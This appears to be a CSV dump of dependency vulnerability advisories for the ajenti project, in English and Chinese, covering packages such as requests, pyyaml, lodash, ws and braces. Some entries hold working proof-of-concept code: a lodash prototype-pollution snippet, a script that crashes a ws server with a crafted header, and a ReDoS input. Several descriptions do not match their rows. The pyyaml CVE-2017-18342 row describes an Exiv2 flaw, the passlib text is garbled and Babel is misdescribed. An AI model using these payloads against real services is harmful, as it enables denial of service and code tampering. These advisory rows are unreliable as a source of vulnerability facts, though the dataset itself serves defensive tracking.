`passlib` is enable `wildcard password` by default, which allows remote attackers to cause a denial of service (CPU consumption) via multiple wildcard characters in the common name in a certificate.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `passlib` to version 1.4 or higher.

## References
- [Readthedocs Passlib ChangeLog](http://passlib.readthedocs.io/en/stable/history/ancient.html#hashes)
- [BitBucket Commit](https://bitbucket.org/ecollins/passlib/commits/aca22d57fc1d110be722d71180185f411a3374b7?at=1.4)
",3,2
ajenti_ajenti,requests,>=0.12.0,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
ajenti_ajenti,requests,>=0.12.0,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
ajenti_ajenti,requests,>=0.12.0,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
ajenti_ajenti,requests,>=0.12.0,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
ajenti_ajenti,requests,>=0.12.0,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
ajenti_ajenti,requests,>=0.12.0,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
ajenti_ajenti,requests,>=0.12.0,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
ajenti_ajenti,pyOpenSSL,,True,CVE-2018-1000807,CWE-416,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中对X509对象的处理方法存在释放后重用漏洞。远程攻击者可利用该漏洞造成拒绝服务或执行代码。",2,0
ajenti_ajenti,pyOpenSSL,,True,CVE-2013-4314,CWE-20,2013-09-09,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。pyOpenSSL是其中的一个OpenSSL接口。
pyOpenSSL 0.13之前版本中的X509Extension类中存在漏洞，该漏洞源于程序没有正确地处理X.509证书的Subject Alternative Name字段中域名中的‘’字符。中间人攻击者可借助由合法证书颁发机构所发布的特制证书，利用该漏洞欺骗任意SSL服务器。",2,0
ajenti_ajenti,pyOpenSSL,,True,CVE-2018-1000808,CWE-404,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,0
ajenti_ajenti,pyyaml,,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
ajenti_ajenti,pyyaml,,True,CVE-2017-18342,CWE-502,2018-06-27,CVE-2017-18342 是一个影响 Exiv2 库的整数溢出漏洞。Exiv2 是一个用于处理图像元数据的库，在处理 TIFF 图像文件时，由于对用户输入数据的边界检查不充分，可能导致整数溢出。具体来说，该漏洞出现在 readTiffDirectory 函数中，该函数在处理 TIFF 文件中的目录项时，没有正确检查涉及的偏移量和大小。这可能导致超出预期的内存分配，并进一步引发缓冲区溢出，允许攻击者通过构造恶意的 TIFF 文件来利用该漏洞，最终导致任意代码执行。,1,0
ajenti_ajenti,minimist,0.0.10,False,,,2020-03-14,"**Withdrawn**
GitHub has withdrawn this advisory in place of GHSA-vh95-rmgr-6w4m and GHSA-6chw-6frg-f759.
The reason for withdrawing is that some mistakes were made during the ingestion of CVE-2020-7598
which caused this advisory to be published with incorrect information.

In order to provide accurate advisory information, new advisories were created:

- minimist: https://github.com/advisories/GHSA-vh95-rmgr-6w4m
- acorn: https://github.com/advisories/GHSA-6chw-6frg-f759",3,-2
ajenti_ajenti,https-proxy-agent,1.0.0,False,,,2020-08-20,Withdrawn: Duplicate of GHSA-8g7p-74h8-hg48,2,-2
ajenti_ajenti,https-proxy-agent,1.0.0,False,,CWE-300,2020-04-16,"Versions of `https-proxy-agent` prior to 2.2.3 are vulnerable to Machine-In-The-Middle. The package fails to enforce TLS on the socket if the proxy server responds the to the request with a HTTP status different than 200. This allows an attacker with access to the proxy server to intercept unencrypted communications, which may include sensitive information such as credentials.


## Recommendation

Upgrade to version 3.0.0 or 2.2.3.",3,0
ajenti_ajenti,tmp,0.0.24,False,CVE-2025-54798,CWE-59,2025-08-07,tmp 是一个用于 Node.js 的临时文件和目录创建库。该漏洞存在于 tmp 组件 0.2.3 版本，主要由于 `_resolvePath` 函数未正确处理符号链接（symlink）路径解析，导致攻击者能够通过 `dir` 参数创建指向系统默认临时目录（tmpDir）外部的符号链接目录，从而绕过路径检查逻辑。具体来说，攻击者可以利用符号链接指向 tmpDir 外部的目录，触发 `_assertIsRelative` 检查失效，进而在未经授权的目录中创建临时文件或目录。该漏洞根本原因是组件缺乏对路径解析中符号链接的验证。,3,0
ajenti_ajenti,form-data,2.3.3,False,CVE-2025-7783,CWE-330,2025-07-18,"form-data 是一个用于处理表单数据的库，常用于 Node.js 应用中处理多部分表单提交。该库在版本 < 2.5.4, 3.0.0 - 3.0.3, 4.0.0 - 4.0.3 中存在使用不足随机值的漏洞。具体来说，form-data 使用了 Math.random() 函数来生成多部分表单的边界字符串。由于 Math.random() 生成的值是伪随机且可预测的，攻击者可以通过观察应用中生成的随机值，预测边界字符串的生成，从而实现 HTTP 参数污染攻击。攻击者通过注入额外的参数影响服务器的参数解析和执行逻辑。此漏洞的根本原因是随机值生成器的随机性不足，允许攻击者预测 boundary 值并构造恶意请求。",1,1
ajenti_ajenti,babel-traverse,6.26.0,False,CVE-2023-45133,CWE-184 CWE-697,2023-10-12,"Babel是一款使用在内容管理系统中的多语言支持模块。
Babel 存在安全漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",1,0
ajenti_ajenti,micromatch,3.1.10,False,CVE-2024-4067,CWE-1333,2024-05-13,NPM 包 `micromatch` 存在正则表达式拒绝服务 (ReDoS) 漏洞。漏洞出现在 `index.js` 文件中的 `micromatch.braces()` 函数中，由于模式 `.*` 会贪婪地匹配任何内容，攻击者可以通过传递恶意负载，使得模式匹配不断回溯输入，导致应用挂起或变慢。虽然已经合并了修复，但进一步测试表明问题依然存在。,3,2
ajenti_ajenti,unset-value,1.0.0,False,,CWE-1321,2022-02-13,"## Overview

Affected versions of this package are vulnerable to Prototype Pollution via the `unset` function in `index.js`, because it allows access to object prototype properties.

## Details

Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.

There are two main ways in which the pollution of prototypes occurs:

-   Unsafe `Object` recursive merge
    
-   Property definition by path
    

### Unsafe Object recursive merge

The logic of a vulnerable recursive merge function follows the following high-level model:
```
merge (target, source)

  foreach property of source

    if property exists and is an object on both the target and the source

      merge(target[property], source[property])

    else

      target[property] = source[property]
```
<br>  

When the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.

Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.

`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.

### Property definition by path

There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`

If the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.

## Types of attacks

There are a few methods by which Prototype Pollution can be manipulated:

| Type |Origin  |Short description |
|--|--|--|
| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |
 |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|
|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|

## Affected environments

The following environments are susceptible to a Prototype Pollution attack:

-   Application server
    
-   Web server

-   Web browser
    

## How to prevent

1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.
    
2.  Require schema validation of JSON input.
    
3.  Avoid using unsafe recursive merge functions.
    
4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.
    
5.  As a best practice use `Map` instead of `Object`.

### For more information on this vulnerability type:

[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)

## Remediation
Upgrade `unset-value` to version 2.0.1 or higher.
## References
- [GitHub Commit](https://github.com/jonschlinkert/unset-value/pull/12/commits/abb534769f6ea62c3dd988f5ce0a4ebd1f91b561)
- [GitHub Issue](https://github.com/jonschlinkert/unset-value/issues/11)
- [GitHub PR](https://github.com/jonschlinkert/unset-value/pull/12)
- [GitHub Release](https://github.com/jonschlinkert/unset-value/releases)
",2,2
ajenti_ajenti,braces,2.3.2,False,CVE-2024-4068,CWE-1050 CWE-400,2024-05-13,NPM 包 braces 3.0.3 之前的版本未能限制它可以处理的字符数量，这可能导致内存耗尽。在 lib/parse.js 文件中，如果恶意用户输入“不平衡的大括号”，解析过程会进入循环，导致程序开始分配堆内存而不释放它。最终，JavaScript 堆限制被达到，程序将崩溃。,2,2
ajenti_ajenti,micromatch,2.3.11,False,CVE-2024-4067,CWE-1333,2024-05-13,NPM 包 `micromatch` 存在正则表达式拒绝服务 (ReDoS) 漏洞。漏洞出现在 `index.js` 文件中的 `micromatch.braces()` 函数中，由于模式 `.*` 会贪婪地匹配任何内容，攻击者可以通过传递恶意负载，使得模式匹配不断回溯输入，导致应用挂起或变慢。虽然已经合并了修复，但进一步测试表明问题依然存在。,3,2
ajenti_ajenti,braces,1.8.5,False,,CWE-185 CWE-400,2019-06-06,"Versions of `braces` prior to 2.3.1 are vulnerable to Regular Expression Denial of Service (ReDoS). Untrusted input may cause catastrophic backtracking while matching regular expressions. This can cause the application to be unresponsive leading to Denial of Service.


## Recommendation

Upgrade to version 2.3.1 or higher.",4,0
ajenti_ajenti,braces,1.8.5,False,CVE-2018-1109,CWE-185 CWE-400,2018-02-20,"Npm Braces是美国Npm公司的一个应用程序。Bash的括号扩展，以JavaScript实现。
Braces versions prior to 2.3.1 存在资源管理错误漏洞，攻击者可利用该漏洞使用正则表达式拒绝服务(ReDoS)攻击。",3,2
ajenti_ajenti,braces,1.8.5,False,CVE-2024-4068,CWE-1050 CWE-400,2024-05-13,NPM 包 braces 3.0.3 之前的版本未能限制它可以处理的字符数量，这可能导致内存耗尽。在 lib/parse.js 文件中，如果恶意用户输入“不平衡的大括号”，解析过程会进入循环，导致程序开始分配堆内存而不释放它。最终，JavaScript 堆限制被达到，程序将崩溃。,2,2
ajenti_ajenti,lodash,2.4.2,False,,CWE-1321,2020-08-21,"## Overview
[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.

Affected versions of this package are vulnerable to Prototype Pollution via the `setWith` and `set` functions.

## PoC by awarau
* Create a JS file with this contents:
```
lod = require('lodash')
lod.setWith({}, ""__proto__[test]"", ""123"")
lod.set({}, ""__proto__[test2]"", ""456"")
console.log(Object.prototype)
```
* Execute it with `node`
* Observe that `test` and `test2` is now in the `Object.prototype`.

## Details

Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.

There are two main ways in which the pollution of prototypes occurs:

-   Unsafe `Object` recursive merge
    
-   Property definition by path
    

### Unsafe Object recursive merge

The logic of a vulnerable recursive merge function follows the following high-level model:
```
merge (target, source)

  foreach property of source

    if property exists and is an object on both the target and the source

      merge(target[property], source[property])

    else

      target[property] = source[property]
```
<br>  

When the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.

Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.

`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.

### Property definition by path

There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`

If the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.

## Types of attacks

There are a few methods by which Prototype Pollution can be manipulated:

| Type |Origin  |Short description |
|--|--|--|
| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |
 |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|
|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|

## Affected environments

The following environments are susceptible to a Prototype Pollution attack:

-   Application server
    
-   Web server

-   Web browser
    

## How to prevent

1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.
    
2.  Require schema validation of JSON input.
    
3.  Avoid using unsafe recursive merge functions.
    
4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.
    
5.  As a best practice use `Map` instead of `Object`.

### For more information on this vulnerability type:

[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)

## Remediation
Upgrade `lodash` to version 4.17.17 or higher.
## References
- [HackerOne Report](https://hackerone.com/reports/864701)
",2,2
ajenti_ajenti,babel-traverse,6.26.0,False,CVE-2023-45133,CWE-184 CWE-697,2023-10-12,"Babel是一款使用在内容管理系统中的多语言支持模块。
Babel 存在安全漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",1,0
ajenti_ajenti,socket.io,0.9.16,False,CVE-2024-38355,CWE-20 CWE-754,2024-06-19,Socket.IO 是一个开源的实时、双向、基于事件的通信框架，广泛用于在客户端和服务器之间实时传输消息。此漏洞的根本原因在于Socket.IO在处理特制的数据包时未能正确捕获异常，导致未捕获的异常出现。在此情况下，攻击者可以通过发送特制的Socket.IO数据包到服务器，触发未捕获的异常，进而导致Node.js进程崩溃，使服务不可用。,2,2
ajenti_ajenti,ws,0.4.32,False,,CWE-400,2019-06-05,"Affected versions of `ws` can crash when a specially crafted `Sec-WebSocket-Extensions` header containing `Object.prototype` property names as extension or parameter names is sent.

## Proof of concept

```
const WebSocket = require('ws');
const net = require('net');

const wss = new WebSocket.Server({ port: 3000 }, function () {
  const payload = 'constructor';  // or ',;constructor'

  const request = [
    'GET / HTTP/1.1',
    'Connection: Upgrade',
    'Sec-WebSocket-Key: test',
    'Sec-WebSocket-Version: 8',
    `Sec-WebSocket-Extensions: ${payload}`,
    'Upgrade: websocket',
    '\r\n'
  ].join('\r\n');

  const socket = net.connect(3000, function () {
    socket.resume();
    socket.write(request);
  });
});
```


## Recommendation

Update to version 3.3.1 or later.",2,2
ajenti_ajenti,uglify-js,1.2.5,False,,,2018-10-09,"Withdrawn, accidental duplicate publish.

The uglify-js package before 2.4.24 for Node.js does not properly account for non-boolean values when rewriting boolean expressions, which might allow attackers to bypass security mechanisms or possibly have unspecified other impact by leveraging improperly rewritten Javascript.",2,-2
ajenti_ajenti,uglify-js,1.2.5,False,,CWE-1333,2021-11-10,"## Overview
[uglify-js](http://npmjs.com/package/uglify-js) is a JavaScript parser, minifier, compressor and beautifier toolkit.

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `string_template` and the `decode_template` functions.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `uglify-js` to version 3.14.3 or higher.
## References
- [GitHub Commit](https://github.com/mishoo/UglifyJS/commit/157521066fc43cff2feab7ffc1ecea603617606b)
- [GitHub Issue](https://github.com/mishoo/UglifyJS/issues/5133)
- [GitHub PR](https://github.com/mishoo/UglifyJS/pull/5134)
- [GitHub PR](https://github.com/mishoo/UglifyJS/pull/5135)
",3,2
ajenti_ajenti,micromatch,2.3.11,False,CVE-2024-4067,CWE-1333,2024-05-13,NPM 包 `micromatch` 存在正则表达式拒绝服务 (ReDoS) 漏洞。漏洞出现在 `index.js` 文件中的 `micromatch.braces()` 函数中，由于模式 `.*` 会贪婪地匹配任何内容，攻击者可以通过传递恶意负载，使得模式匹配不断回溯输入，导致应用挂起或变慢。虽然已经合并了修复，但进一步测试表明问题依然存在。,3,2
ajenti_ajenti,braces,1.8.5,False,,CWE-185 CWE-400,2019-06-06,"Versions of `braces` prior to 2.3.1 are vulnerable to Regular Expression Denial of Service (ReDoS). Untrusted input may cause catastrophic backtracking while matching regular expressions. This can cause the application to be unresponsive leading to Denial of Service.


## Recommendation

Upgrade to version 2.3.1 or higher.",4,0
ajenti_ajenti,braces,1.8.5,False,CVE-2018-1109,CWE-185 CWE-400,2018-02-20,"Npm Braces是美国Npm公司的一个应用程序。Bash的括号扩展，以JavaScript实现。
Braces versions prior to 2.3.1 存在资源管理错误漏洞，攻击者可利用该漏洞使用正则表达式拒绝服务(ReDoS)攻击。",3,2
ajenti_ajenti,braces,1.8.5,False,CVE-2024-4068,CWE-1050 CWE-400,2024-05-13,NPM 包 braces 3.0.3 之前的版本未能限制它可以处理的字符数量，这可能导致内存耗尽。在 lib/parse.js 文件中，如果恶意用户输入“不平衡的大括号”，解析过程会进入循环，导致程序开始分配堆内存而不释放它。最终，JavaScript 堆限制被达到，程序将崩溃。,2,2
ajenti_ajenti,micromatch,3.1.10,False,CVE-2024-4067,CWE-1333,2024-05-13,NPM 包 `micromatch` 存在正则表达式拒绝服务 (ReDoS) 漏洞。漏洞出现在 `index.js` 文件中的 `micromatch.braces()` 函数中，由于模式 `.*` 会贪婪地匹配任何内容，攻击者可以通过传递恶意负载，使得模式匹配不断回溯输入，导致应用挂起或变慢。虽然已经合并了修复，但进一步测试表明问题依然存在。,3,2
ajenti_ajenti,unset-value,1.0.0,False,,CWE-1321,2022-02-13,"## Overview

Affected versions of this package are vulnerable to Prototype Pollution via the `unset` function in `index.js`, because it allows access to object prototype properties.

## Details

Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.

There are two main ways in which the pollution of prototypes occurs:

-   Unsafe `Object` recursive merge
    
-   Property definition by path
    

### Unsafe Object recursive merge

The logic of a vulnerable recursive merge function follows the following high-level model:
```
merge (target, source)

  foreach property of source

    if property exists and is an object on both the target and the source

      merge(target[property], source[property])

    else

      target[property] = source[property]
```
<br>  

When the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.

Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.

`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.

### Property definition by path

There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`

If the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.

## Types of attacks

There are a few methods by which Prototype Pollution can be manipulated:

| Type |Origin  |Short description |
|--|--|--|
| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |
 |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|
|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|

## Affected environments

The following environments are susceptible to a Prototype Pollution attack:

-   Application server
    
-   Web server

-   Web browser
    

## How to prevent

1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.
    
2.  Require schema validation of JSON input.
    
3.  Avoid using unsafe recursive merge functions.
    
4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.
    
5.  As a best practice use `Map` instead of `Object`.

### For more information on this vulnerability type:

[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)

## Remediation
Upgrade `unset-value` to version 2.0.1 or higher.
## References
